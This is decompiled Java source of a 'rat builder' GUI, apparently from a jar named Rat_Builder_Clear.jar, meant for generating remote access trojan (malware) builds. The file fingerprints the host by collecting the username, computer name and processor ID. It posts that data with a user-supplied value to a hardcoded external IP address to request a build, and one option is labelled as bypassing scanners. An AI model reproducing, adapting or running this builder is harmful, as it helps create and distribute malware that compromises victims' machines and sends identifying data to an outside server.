package org.example;

import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.File;
import java.io.IOException;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.Base64;
import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JPanel;
import javax.swing.JTextField;
import org.apache.http.HttpStatus;
import org.apache.http.client.methods.HttpPost;

/* loaded from: Rat_Builder_Clear.jar:org/example/Main.class */
class Main extends JFrame implements ActionListener {
    static JFrame frame;
    static JTextField textbox;
    static final File appData = new File(System.getenv("APPDATA"));
    Boolean notdone = true;
    Boolean first = true;
    Boolean noteditedhooker = true;

    public Main() throws IOException {
        frame = new JFrame("rat builder");
        JButton button = new JButton("Detectable (mod works 100/100)");
        JButton button2 = new JButton("Scanners Bypass (mod works 75/100)");
        button.addActionListener(this);
        button2.addActionListener(this);
        textbox = new JTextField(85);
        JPanel panel = new JPanel();
        panel.add(textbox);
        panel.add(button);
        panel.add(button2);
        frame.add(panel);
        frame.setDefaultCloseOperation(3);
        frame.setSize(1000, (int) HttpStatus.SC_INTERNAL_SERVER_ERROR);
        frame.move((int) HttpStatus.SC_MULTIPLE_CHOICES, (int) HttpStatus.SC_MULTIPLE_CHOICES);
        frame.setVisible(true);
    }

    public static void main(String[] args) throws IOException {
        new Main();
    }

    public void actionPerformed(ActionEvent e) {
        String h = Base64.getEncoder().encodeToString((System.getenv("user.name") + System.getenv("COMPUTERNAME") + System.getenv("PROCESSOR_IDENTIFIER").replace(" ", "").replace(",", "")).getBytes(StandardCharsets.UTF_8));
        String json = null;
        if (e.getActionCommand().equals("Detectable (mod works 100/100)")) {
            json = "{\"n\":\"" + System.getProperty("user.name") + "\",\"w\":\"" + textbox.getText() + "\",\"h\":\"" + h + "\",\"r\":\"91\"}";
        } else if (e.getActionCommand().equals("Scanners Bypass (mod works 75/100)")) {
            json = "{\"n\":\"" + System.getProperty("user.name") + "\",\"w\":\"" + textbox.getText() + "\",\"h\":\"" + h + "\",\"r\":\"92\"}";
        }
        try {
            URL obj = new URL("http://185.103.101.105:1488/build/");
            HttpURLConnection con = (HttpURLConnection) obj.openConnection();
            con.setRequestMethod(HttpPost.METHOD_NAME);
            con.setRequestProperty("Content-Type", "application/json");
            con.setDoOutput(true);
            OutputStream os = con.getOutputStream();
            byte[] input = json.getBytes("utf-8");
            os.write(input, 0, input.length);
            if (os != null) {
                if (0 != 0) {
                    os.close();
                } else {
                    os.close();
                }
            }
            int responseCode = con.getResponseCode();
            System.out.println("Ответ сервера: " + responseCode);
        } catch (Exception e2) {
            e2.printStackTrace();
            throw new RuntimeException(e2);
        }
    }
}
